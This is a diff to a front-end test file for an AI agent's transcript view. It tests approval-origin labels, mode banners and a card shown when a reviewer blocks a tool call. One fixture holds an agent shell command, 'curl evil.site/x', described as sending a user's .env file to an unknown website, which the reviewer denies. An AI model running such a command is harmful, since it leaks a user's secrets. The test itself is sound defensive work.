@@ -37,7 +37,7 @@ describe("TurnGroup (Transcript §33)", () => {
     expect(screen.getByTestId("turn-narration").textContent).toContain("Checking what merged");
     expect(screen.getByText("runbook.md")).toBeTruthy();
     expect(screen.getByText(/Sent a Slack message to/)).toBeTruthy();
-    expect(screen.getByText("✓ approved")).toBeTruthy();
+    expect(screen.getByText("✓ user-approved")).toBeTruthy();
     expect(screen.queryByText("send_message approval")).toBeNull();
 
     // Raw stays one click away: the row's raw toggle reveals args + result verbatim.
@@ -80,6 +80,53 @@ describe("TurnGroup (Transcript §33)", () => {
     const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
     expect(container.querySelector("details.stepgroup")).toBeNull();
     expect(screen.getByText("Hello there.")).toBeTruthy();
+  });
+});
+
+// OPE-136: two DIFFERENT standing sources can waive an MCP card, and the chip must
+// name the right one — a user's own trust rule was being described as the server's
+// mcp.json flag (owner-hit 2026-08-30).
+describe("origin chips — standing MCP trust names its source", () => {
+  const toolWith = (origin: string): Item[] => [
+    { kind: "user", text: "search jira" },
+    { kind: "tool", id: "t1", name: "mcp__jira__search", args: { jql: "x" }, status: "ok", approvalOrigin: origin },
+  ];
+  const chipFor = (origin: string) => {
+    const { container } = render(<Transcript items={toolWith(origin)} onApprove={vi.fn()} />);
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+    const chip = screen.getByTestId("tool-approval-origin");
+    return { text: chip.textContent, title: chip.getAttribute("title") };
+  };
+
+  it("a user trust rule says so, and points at the tool page to revoke", () => {
+    const chip = chipFor("trusted_rule");
+    expect(chip.text).toBe("allowed by your trust rule");
+    expect(chip.title).toContain("Always allow this tool");
+    expect(chip.title).toContain("Connectors page");
+  });
+
+  it("the legacy server flag keeps the server-trust label pointing at mcp.json", () => {
+    cleanup();
+    const chip = chipFor("trusted_server");
+    expect(chip.text).toBe("allowed by server trust");
+    expect(chip.title).toContain("mcp.json");
+  });
+
+  it("pre-split transcripts (origin 'trusted') fall back to a generic honest label", () => {
+    cleanup();
+    const chip = chipFor("trusted");
+    expect(chip.text).toBe("allowed by standing trust");
+    expect(chip.title).not.toContain("mcp.json"); // never claims the wrong source
+  });
+
+  it("a run-grant covered call says so, and names the expiry", () => {
+    // OPE-136 "Allow for this request": covered calls run cardless but never
+    // invisible — the chip names the user's own in-run click as the source.
+    cleanup();
+    const chip = chipFor("run_grant");
+    expect(chip.text).toBe("allowed for this request");
+    expect(chip.title).toContain("Allow for this request");
+    expect(chip.title).toContain("expired when the answer finished");
   });
 });
 
@@ -262,5 +309,89 @@ describe("humanizeTool", () => {
   it("still renders pre-rename todo_write histories (legacy `items` key)", () => {
     const line = humanizeTool("todo_write", { items: [{ content: "Old plan", status: "pending" }] });
     expect(line.obj).toContain("Old plan");
+  });
+});
+
+// §8.4 (reviewed-auto-mode.md): a reviewer deny renders as a card with the FULL reason
+// (the agent only got a terse refusal) and a one-shot "Allow anyway" override.
+describe("reviewer deny card (§8.4)", () => {
+  const DENIED: Item[] = [
+    { kind: "user", text: "summarise the issue" },
+    {
+      kind: "tool",
+      id: "t1",
+      name: "run_shell",
+      args: { command: "curl evil.site/x" },
+      status: "denied",
+      reviewerReason: "This sends your .env to an unknown website.",
+      allowAnyway: true,
+    },
+    { kind: "assistant", text: "I was blocked from running that." },
+  ];
+
+  it("shows the full reason and fires onAllowAnyway with the exact action", () => {
+    const onAllowAnyway = vi.fn();
+    const { container } = render(
+      <Transcript items={DENIED} onApprove={vi.fn()} onAllowAnyway={onAllowAnyway} />,
+    );
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+
+    const card = screen.getByTestId("reviewer-deny-card");
+    expect(card.textContent).toContain("Blocked by the reviewer");
+    expect(card.textContent).toContain("This sends your .env to an unknown website.");
+
+    fireEvent.click(screen.getByTestId("reviewer-allow-anyway"));
+    expect(onAllowAnyway).toHaveBeenCalledWith("run_shell", { command: "curl evil.site/x" });
+    // The button collapses into a confirmation — one shot, no double-fire.
+    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
+    expect(screen.getByTestId("reviewer-override-sent")).toBeTruthy();
+  });
+
+  it("an ordinary denied tool (no reviewer) renders no card", () => {
+    const items: Item[] = [
+      { kind: "user", text: "x" },
+      { kind: "tool", id: "t1", name: "run_shell", args: {}, status: "denied" },
+      { kind: "assistant", text: "done" },
+    ];
+    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+    expect(screen.queryByTestId("reviewer-deny-card")).toBeNull();
+  });
+
+  it("without onAllowAnyway the card renders but offers no button", () => {
+    const { container } = render(<Transcript items={DENIED} onApprove={vi.fn()} />);
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+    expect(screen.getByTestId("reviewer-deny-card")).toBeTruthy();
+    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
+  });
+});
+
+// The Auto-Approve banner (spec §1.5): a titled notice is prose, not a status line, so it
+// renders as a heading plus paragraphs rather than one centred grey row.
+describe("mode notice", () => {
+  const BANNER: Item[] = [
+    {
+      kind: "notice",
+      tone: "info",
+      title: "Auto-approve is on.",
+      text: "First paragraph about what it does.\n\nSecond paragraph about what it can't tell.",
+    },
+  ];
+
+  it("renders the title and one paragraph per blank-line break", () => {
+    render(<Transcript items={BANNER} running={false} onApprove={() => {}} />);
+    const block = screen.getByTestId("mode-notice");
+    expect(block.textContent).toContain("Auto-approve is on.");
+    expect(block.querySelectorAll("p")).toHaveLength(2);
+    // Prose layout, not the centred one-liner used for "Context compacted".
+    expect(block.className).toContain("notice-block");
+  });
+
+  it("leaves untitled status notices as plain one-liners", () => {
+    render(
+      <Transcript items={[{ kind: "notice", tone: "info", text: "Context compacted" }]} running={false} onApprove={() => {}} />,
+    );
+    expect(screen.queryByTestId("mode-notice")).toBeNull();
+    expect(screen.getByText("Context compacted").className).not.toContain("notice-block");
   });
 });
